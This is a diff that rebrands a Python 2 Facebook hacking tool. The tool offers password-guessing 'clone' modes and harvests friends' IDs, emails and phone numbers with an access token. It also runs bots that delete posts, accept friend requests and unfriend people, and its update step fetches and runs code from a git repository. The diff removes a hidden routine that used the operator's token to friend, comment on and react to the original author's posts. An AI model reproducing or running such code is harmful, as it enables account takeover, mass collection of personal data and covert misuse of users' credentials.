@@ -13,7 +13,7 @@ try:
 except ImportError:
     os.system('pip2 install requests')
     os.system('pip2 install mechanize')
-    os.system('python2 jam.py')
+    os.system('python2 aamir.py')
 
 #Browser Setting
 reload(sys)
@@ -58,17 +58,16 @@ def sani(z):
 		time.sleep(0.1)
 ##### LOGO #####
 banner = """
-\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m█████████  \033[1;92m ▀
-\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ 
-\033[1;91m  ███         \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ 
-\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m███   ███  \033[1;92m███ 
-\033[1;91m         ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  
-\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  
-\033[1;91m  ██████████  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \x1b[1;90mQUEEN
+\033[1;97m  ___  \033[1;91m  ___  \033[1;96m___  ______________ 
+\033[1;97m / _ \ \033[1;91m / _ \ \033[1;96m|  \/  |_   _| ___ \
+\033[1;97m/ /_\ \\033[1;91m/ /_\ \\033[1;96m| .  . | | | | |_/ /
+\033[1;97m|  _  |\033[1;91m|  _  |\033[1;96m| |\/| | | | |    / 
+\033[1;97m| | | |\033[1;91m| | | |\033[1;96m| |  | |_| |_| |\ \ 
+\033[1;97m\_| |_/\033[1;91m\_| |_/\033[1;96m\_|  |_/\___/\_| \_| \033[1;90mKING
 \033[1;94m══════════════════════════════════════════════
-\033[1;90m➣ Author : \033[1;97mSTYLISH QUEEN
-\033[1;90m➣ Github : \033[1;97mhttps://github.com/stylish-queen
-\033[1;90m➣ Fb Page: \033[1;97mJam Shahrukh Official
+\033[1;90m➣ OWNER  : \033[1;97mAAMIR JAVED
+\033[1;90m➣ Fb-Team: \033[1;97mHUNTSMAN KINGS OF FACEBOOK
+\033[1;90m➣ Github : \033[1;97mhttps://github.com/huntsman-team
 \033[1;94m══════════════════════════════════════════════ """
 # titik #
 def tik():
@@ -98,7 +97,7 @@ def menu():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		os.system('python2 aamir.py')
 	try:
 		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
 		a = json.loads(otw.text)
@@ -109,11 +108,11 @@ def menu():
 		print"[!] Account Is On Checkpoint"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		os.system('python2 aamir.py')
 	except requests.exceptions.ConnectionError:
 		print"[!] No Connection"
 		time.sleep(1)
-		('python2 jam.py')
+		('python2 aamir.py')
 	os.system("clear")
 	print banner
 	print "|[✓] Name: "+z
@@ -121,13 +120,12 @@ def menu():
 	print (47*"-")
 	print "[1] Clone With 4 Pass Mode."
 	print "[2] Clone With 2 Pass Mode."
-	print "[3] Clone With 1 Pass Mode."
-	print "[4] Extract Tools."
-	print "[5] Lock Profile Tool."
-	print "[6] Auto Del Tools."
-	print "[7] Update jam Tool."
-	print "[8] Follow Me On Facebook."
-	print "[9] Logout"
+	print "[3] Extract Tools."
+	print "[4] Lock Profile Tool."
+	print "[5] Auto Del Tools."
+	print "[6] Update Tool."
+	print "[7] Follow Me On Facebook."
+	print "[8] Logout"
 	print ('                  ')
 	men()
 
@@ -139,30 +137,24 @@ def men():
 	elif rana =="1":
 	    os.system('clear')
 	    jam('[!] Please Wait While Page Is Loding.')
-	    sani('Stylish Queen-100%...')
+	    sani('HUNTSMAN TEAM-100%...')
 	    os.system('python2 crack.py')
 	elif rana =="2":
 	    os.system('clear')
 	    jam('[!] Please Wait While Page Is Loding.')
-	    sani('Stylish Queen-100%...')
+	    sani('HUNTSMAN TEAM-100%...')
 	    os.system('python2 fast.py')
 	    time.sleep(1)
 	elif rana =="3":
-	    os.system('clear')
-	    jam('[!] Please Wait While Page Is Loding.')
-	    sani('Stylish Queen-100%...')
-	    os.system('python2 crack2.py')
-	    time.sleep(1)
-	elif rana =="4":
 		grab()
-	elif rana =="5":
+	elif rana =="4":
 		os.system('clear')
-	        sani('Stylish Queen-100%...')
+	        sani('HUNTSMAN TEAM-100%...')
 		os.system('python locked.py')
 		time.sleep(1)
-	elif rana =="6":
+	elif rana =="5":
 		bot()
-	elif rana =="7":
+	elif rana =="6":
 		os.system('clear')
 		print banner
 		jam('[✓] Please Wait While Tool Is Updating')
@@ -170,16 +162,16 @@ def men():
 		jam('[✓] Tool Has Been Update Successfully')
 		jam('[✓] Please Wait While Update Is Setting Up On Your Mobile Phone')
 		time.sleep(3)
-		os.system('cd .. && rm -rf sani')
-		os.system('git clone https://github.com/cyber-jam/sani')
-		os.system('cd sani && python2 jam.py')
-	elif rana =="8":
-		os.system('xdg-open https://www.facebook.com/jam.shahrukh.official')
+		os.system('cd .. && rm -rf aamir-javed')
+		os.system('git clone https://github.com/huntsman-team/aamir-javed')
+		os.system('cd sani && python2 aamir.py')
+	elif rana =="7":
+		os.system('xdg-open https://www.facebook.com/aamir.bahtti.311')
 		menu()
-	elif rana =="9":
+	elif rana =="8":
 		os.system('rm -rf login.txt')
 		jam('[✓] Logged Out Successfully')
-		os.system('python2 jam.py')
+		os.system('python2 aamir.py')
 	else:
 		print "[!] Wrong Input"
 		men()
@@ -192,26 +184,13 @@ def grab():
 	except IOError:
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
-		una = ('100052292505058')
-	        kom = ('Hai Bang Andre😆🖐️')
-	        reac = ('ANGRY')
-	        post = ('185535143199568')
-	        post2 = ('185535143199568')
-	        kom2 = ('Saatnya Ngehack Hahaha😂🤣')
-	        reac2 = ('LOVE')
-	        requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
-	        requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
-	        requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
-	        requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
-	        requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
 		time.sleep(1)
-		os.system('python2 jam.py')
+		os.system('python2 aamir.py')
 	os.system('clear')
 	print banner
 	print "[1] Extract Numeric IDs From Public ID."
 	print "[2] Extract Email's From Public ID."
 	print "[3] Extract Phone Number From Public ID."
-	print "[4] Extract Likes From Post ID."
 	print "[0] Back."
 	print('          ')
 	grab_menu()
@@ -228,10 +207,6 @@ def grab_menu():
 		emailfromfriend()
 	elif grm =="3":
 		numberfromfriend()
-	elif grm =="4":
-		idfrompost()
-	elif grm =="5":
-		idfromgroup()
 	elif grm =="0":
 		menu()
 	else:
@@ -249,7 +224,7 @@ def idfromfriend():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		('python2 jam.py')
+		('python2 aamir.py')
 	try:
 		os.mkdir('/sdcard/ids')
 	except OSError:
@@ -270,7 +245,7 @@ def idfromfriend():
 		z=json.loads(r.text)
 		jam('[✓] Getting Friends Numeric IDs...')
 		print"--------------------------------------"
-		bz = open('/sdcard/ids/jam_file.txt','w')
+		bz = open('/sdcard/ids/aamir_file.txt','w')
 		for a in z['friends']['data']:
 			idh.append(a['id'])
 			bz.write(a['id'] + ' | ' '\n')
@@ -299,65 +274,6 @@ def idfromfriend():
 		time.sleep(1)
 		grab()
 
-##### Reactions POST ID EXTRACT#####
-def idfrompost():
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"[!] Token Not Found"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		('python2 jam.py')
-	try:
-		os.mkdir('/sdcard/ids')
-	except OSError:
-		pass
-	try:
-		os.system('clear')
-		print banner
-		una = ('100052292505058')
-		una = raw_input("[+] Post ID : ")
-		try:
-			jok = requests.get("https://graph.facebook.com/me/friends?method=post&uids="+una+"&access_token="+toket)
-			op = json.loads(jok.text)
-		except KeyError:
-			print"[!] Friend Not Found"
-			raw_input("Press Enter To Back ")
-			grab()
-		r=requests.get("https://graph.facebook.com/"+una+"/reactions?limit=9999999&access_token="+toket)
-		z=json.loads(r.text)
-		jam('[✓] Getting Post Likes Extract IDs...')
-		print"--------------------------------------"
-		bz = open('/sdcard/ids/jam_post.txt','w')
-		for a in z['data']:
-			idh.append(a['id'])
-			bz.write(a['id'] + ' | ' '\n')
-			print ("\r["+str(len(idh))+" ] => "+a['id']),;sys.stdout.flush();time.sleep(0.001)
-		bz.close()
-		print '\r[✓] The Process Has Been Completed.'
-		print"\r[✓] Total IDs Founded : "+str(len(idh))
-		done = raw_input("\r[?] Save File With Name : ")
-		print("\r[✓] The File Has Been Saved As save/"+done)
-		raw_input("\nPress Enter To Back ")
-		grab()
-	except IOError:
-		print"[!] Error While Creating file"
-		
-		raw_input("\nPress Enter To Back ")
-		grab()
-	except (KeyboardInterrupt,EOFError):
-		print("[!]The Process Has Been Stopped")
-		raw_input("\nPress Enter To Back ")
-		grab()
-	except KeyError:
-		print('[!] Error')
-		raw_input("\nPress Enter To Back ")
-		grab()
-	except requests.exceptions.ConnectionError:
-		print"[✖] No Connection"
-		time.sleep(1)
-		grab()
 
 ##### EMAIL FROM Friend#####
 def emailfromfriend():
@@ -368,7 +284,7 @@ def emailfromfriend():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		os.system('python2 aamir.py')
 	try:
 		os.mkdir('/sdcard/Email.txt')
 	except OSError:
@@ -435,7 +351,7 @@ def numberfromfriend():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		os.system('python2 aamir.py')
 	try:
 		os.mkdir('/sdcard/Number.txt')
 	except OSError:
@@ -500,7 +416,7 @@ def bot():
 		print"[!] Token not found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		os.system('python2 aamir.py')
 	os.system('clear')
 	print banner
 	print "[1] Auto Delete Posts."
@@ -541,7 +457,7 @@ def deletepost():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(0.1)
-		os.system('python2 jam.py')
+		os.system('python2 aamir.py')
 	os.system('clear')
 	print banner
 	print("[✓] Account Name : "+nama)
@@ -578,7 +494,7 @@ def accept():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		os.system('python2 aamir.py')
 	os.system('clear')
 	print banner
 	limit = raw_input("[+] Enter Limit To Accept Requests : ")
@@ -611,7 +527,7 @@ def unfriend():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		os.system('python2 aamir.py')
 	os.system('clear')
 	print banner
 	jam('[✓] The Process Has Been Started.')
